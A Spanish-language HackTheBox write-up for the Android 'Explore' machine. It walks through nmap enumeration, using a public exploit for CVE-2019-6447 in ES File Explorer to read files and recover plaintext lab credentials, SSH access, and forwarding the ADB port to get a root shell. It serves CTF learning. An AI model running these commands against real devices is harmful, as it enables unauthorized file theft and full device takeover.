---
title: "Explore - HTB Writeup"
layout: single
excerpt: "Explore es una máquina de dificultad fácil de la plataforma de HackTheBox. Para obtener acceso inicial a la máquina, nos conectamos por SSH utilizando unas credenciales que logramos ver explotando una vulnerabilidad de una versión desactualizada del software ES File Explorer. Para escalar privilegios, nos aprovechamos de la herramienta de debugging ADB para generar una shell como root."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/139664515-df0741cd-906a-4af5-bf62-fc4e66ea458f.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - WordPress
  - Insecure Deserialization
  - Docker
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/139665193-1e08a443-5fa2-4668-8fcc-39974658fd92.png)

# Enumeración

Comenzamos enviando una paquete [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} a la máquina con la herramienta `ping`, con esto veremos su estado y su **sistema operativo**:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ping -c 1 10.10.10.247
PING 10.10.10.247 (10.10.10.247) 56(84) bytes of data.
64 bytes from 10.10.10.247: icmp_seq=1 ttl=63 time=69.2 ms

--- 10.10.10.247 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 69.201/69.201/69.201/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el `TTL`, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

# Nmap

Iniciamos la fase de reconocimiento de puertos con ayuda de la herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.10.247 -sC -sV -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-01 11:39 WET
Nmap scan report for 10.10.10.247
Host is up (0.068s latency).
Not shown: 65530 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
36923/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 11:39:43 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Mon, 01 Nov 2021 11:39:43 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Mon, 01 Nov 2021 11:39:48 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 11:40:03 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 11:39:48 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 11:40:03 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 11:40:03 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Mon, 01 Nov 2021 11:40:03 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).

Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.58 seconds
```
| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Podemos ver varios puertos abiertos:

| Puerto | Servicio |
|:------:|:--------:|
| 2222 | Corresponde al servicio [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 36923 | No sabemos |
| 42135 | Puerto utilizado por el software [ES File Explorer](https://www.xatakandroid.com/productividad-herramientas/es-file-explorer-el-administrador-de-archivos-total), una app de Android |
| 59777 | Parece ser un servicio [HTTP](https://www.pickaweb.es/ayuda/que-es-http/){:target="\_blank"}{:rel="noopener nofollow"} |

# User.txt

Me llama la atención el puerto sostenido por el servicio `ES File Explorer` e investigo un poco más sobre este:

![image](https://user-images.githubusercontent.com/67548295/139671914-67c50053-8098-496e-b258-f4e566232a45.png)

Al intentar buscar información sobre este puerto vemos que se hace mención a una vulnerabilidad.

Podemos ver su [identificador CVE](https://www.redhat.com/es/topics/security/what-is-cve){:target="\_blank"}{:rel="noopener nofollow"} y también podemos comprobar que existen modulos de `metasploit` para explotar esta vulnerabilidad.

Pero en este blog no utilizamos `metasploit`, asi que me apoyo de un [_Proof of concept_ de GitHub](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln){:target="\_blank"}{:rel="noopener nofollow"} para explotar la vulnerabilidad de forma manual.

LA vulnerabilidad consiste en lo siguiente:

> Cada vez que un usuario abre la aplicación, se monta un servidor **HTTP**. El servidor se ejecuta en el puerto `59777`.
> En este puerto, un atacante puede enviar payloads en **JSON** para obtener información sobre el dispositivo, descargar imágenes, ejecutar aplicaciones remotamente, etc.

Buscando por `exploitDB` encuentro un exploit funcional:

* [ES File Explorer 4.1.9.7.4 - Arbitrary File Read](https://www.exploit-db.com/exploits/50070){:target="\_blank"}{:rel="noopener nofollow"}

```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ python3 50070.py whoami 10.10.10.247
[-] WRONG COMMAND!
Available commands : 
  listFiles         : List all Files.
  listPics          : List all Pictures.
  listVideos        : List all videos.
  listAudios        : List all audios.
  listApps          : List Applications installed.
  listAppsSystem    : List System apps.
  listAppsPhone     : List Communication related apps.
  listAppsSdcard    : List apps on the SDCard.
  listAppsAll       : List all Application.
  getFile           : Download a file.
  getDeviceInfo     : Get device info.
  ```
  
Intento ejecutar un `whoami` pero no podemos.

Únicamente podemos ejecutar esos comandos que se nos listan.

Probemos con el comando `getDeviceInfo`:

```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ python3 50070.py "getDeviceInfo" 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : VMware Virtual Platform
ftpRoot : /sdcard
ftpPort : 3721
```
Podemos concluir que hay una ruta con nombre `/sdcard`.

Intentemos ejecutar otro comando, `listPics` por ejemplo:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ python3 50070.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```
Podemos ver 4 archivos de imágen, pero hay uno que llama la atención.

¿`creds.jpg`? ¿Credenciales?

Uso la función para descargar archivos que tiene implementado el exploit para examinar más en detalle esta imágen, que concretamente está localizada en `/storage/emulated/0/DCIM/creds.jpg`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ python3 50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
```
Parece ser que se ha descargado, veamos la imagen para ver de que se trata:

![out](https://user-images.githubusercontent.com/67548295/139682005-3770fedb-bb3d-434b-9c92-bbdaad173a44.jpeg)

> Creds → kristi:Kr1sT!5h@Rp3xPl0r3!

¡Vaya! Parece ser un usuario y una contraseña.

Además la máquina tiene un puerto con SSH abierto. ¿Qué más se puede pedir?

Probemos a conectarnos por SSH con estas credenciales:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ ssh kristi@10.10.10.247 -p 2222
Password authentication
Password: 
:/ $ whoami
u0_a76
```
¡Estamos dentro!

Una vez hemos llegado a este punto, podremos ver la flag `user.txt` en la ruta `/sdcard/user.txt`:

```bash
:/ $ cat /sdcard/user.txt                                                      
fXXXXXXXXXXXXXXXXXXXXXXXXXXXXX0
```
# Root.txt 

Tras enumerar el sistema durante un buen rato, me doy cuenta de que hay puertos abiertos internamente:

```bash
:/sdcard $ netstat -nat | grep "LISTEN"                                        
tcp6       0      0 :::42135                :::*                    LISTEN     
tcp6       0      0 ::ffff:127.0.0.1:40031  :::*                    LISTEN     
tcp6       0      0 :::59777                :::*                    LISTEN     
tcp6       0      0 ::ffff:10.10.10.2:44263 :::*                    LISTEN     
tcp6       0      0 :::2222                 :::*                    LISTEN     
tcp6       0      0 :::5555                 :::*                    LISTEN 
```
Tenemos varios puertos altos que corresponden al software `ES file Explorer` y a otras funciones internas del dispositivo.

Pero me llama la atención el puerto `5555`.

Investigo sobre este puerto en Internet:

![image](https://user-images.githubusercontent.com/67548295/139686650-e41c6bde-0e91-4cc6-97ae-1e016e738ac6.png)

Al buscar información sobre el puerto `5555` descubrimos la palabra clave `ADB`

Ahora busquemos por esta palabra:

![image](https://user-images.githubusercontent.com/67548295/139687002-eef402c5-4b6f-4c6d-ab3d-e6c5b3525cf8.png)

Por lo que vemos parece ser un conjunto de herramientas con varias funciones, entre ellas proveer **una shell de Unix**.

Hagamos un [local port forwarding](https://culturacion.com/que-es-port-forwarding/){:target="\_blank"}{:rel="noopener nofollow"} para que este puerto sea accesible desde nuestra máquina y para poder enumerarlo con más facilidad.

```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555
Password authentication
Password: 
:/ $ 
```
Bien, ya tenemos conectividad con este puerto desde nuestra máquina. Probemos a usar `nmap` para escanear este puerto:

```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ sudo nmap -p5555 -sV -sC 127.0.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-01 17:22 WET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000053s latency).

PORT     STATE SERVICE  VERSION
5555/tcp open  freeciv?
| fingerprint-strings: 
|   adbConnect: 
|     CNXN
|_    device::ro.product.name=android_x86_64;ro.product.model=VMware Virtual Platform;ro.product.device=x86_64;features=cmd,stat_v2,shell_v2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5555-TCP:V=7.92%I=7%D=11/1%Time=6180224E%P=x86_64-pc-linux-gnu%r(ad
SF:bConnect,9E,"CNXN\x01\0\0\x01\0\x10\0\0\x86\0\0\0\x8e1\0\0\xbc\xb1\xa7\
SF:xb1device::ro\.product\.name=android_x86_64;ro\.product\.model=VMware\x
SF:20Virtual\x20Platform;ro\.product\.device=x86_64;features=cmd,stat_v2,s
SF:hell_v2");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.51 seconds
```

No conseguimos ver nada interensante.

Habíamos leído anteriormente que `ADB` era capaz de proporcionar una shell de Unix. Pero, ¿como?

Investigo en Internet hasta que encuentro algo interesante:

![image](https://user-images.githubusercontent.com/67548295/139720877-04ec9822-0fb5-4282-8eda-1e7999e49152.png)

Encuentro lo que parece ser un _cheat sheet_ de comandos de `ADB`.

Si no tienes instalado la herramienta `adb` en linux, no pasa nada, aquí te dejo el comando de instalación:

| Sistema | Comando |
|:-------:|:-------:|
| Basados en `Debian` | `sudo apt-get install adb` |
| Basados en `Fedora`/`SUSE` | `sudo yum install android-tools` |

Pruebo a ejecutar el comando `adb shell ls` que se supone que me debería de reportar el resultado del comando `ls` en el sistema:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ adb shell ls
error: no devices/emulators found
```
Recibo un error asi que lo busco en Internet

![image](https://user-images.githubusercontent.com/67548295/139734909-a3f1df32-f31c-4d5f-851b-a5746a0bfd10.png)

Encuentro la solución, parece ser que antes de ejecutar cualquier comando hay que conectarse al dispositivo con `adb connect IP:port`

Bien, probemos:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ adb connect 127.0.0.1:5555
connected to 127.0.0.1:5555
```
Ahora ejecutemos de nuevo el comando `adb shell ls`

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $adb shell ls
acct
bin
bugreports
cache
charger
config
d
data
default.prop
dev
etc
fstab.android_x86_64
init
init.android_x86_64.rc
init.environ.rc
init.rc
init.superuser.rc
init.usb.configfs.rc
init.usb.rc
init.zygote32.rc
init.zygote64_32.rc
lib
mnt
odm
oem
plat_file_contexts
plat_hwservice_contexts
plat_property_contexts
plat_seapp_contexts
plat_service_contexts
proc
product
sbin
sdcard
sepolicy
storage
sys
system
ueventd.android_x86_64.rc
ueventd.rc
vendor
vendor_file_contexts
vendor_hwservice_contexts
vendor_property_contexts
vendor_seapp_contexts
vendor_service_contexts
vndservice_contexts
```
Podemos tener una shell interactiva corriendo una terminal `sh`

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ adb shell /bin/sh 
whoami
root
```
¡Y además ya somos `root`!, (Si no fuese así, deberás ejecutar el comando `su` y deberías convertirte en usuario `root`)

Una vez aquí, podremos ver la flag `root.txt` en `/data/root.txt`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ adb shell "cat /data/root.txt"
fXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5
```

# Conclusión

En esta máquina Android (Linux), para acceder como usuario no privilegiado, hemos explotado una vulnerabilidad de una versión desactualizada del software `ES file explorer` con el que hemos podido visualizar una imágen con credenciales, las cuales hemos utilizado para conectarnos a la máquina por SSH.
Para obtener acceso como usuario root, nos hemos aprovechado de un puerto abierto internamente que correspondía con `ADB` para generar una shell como root.








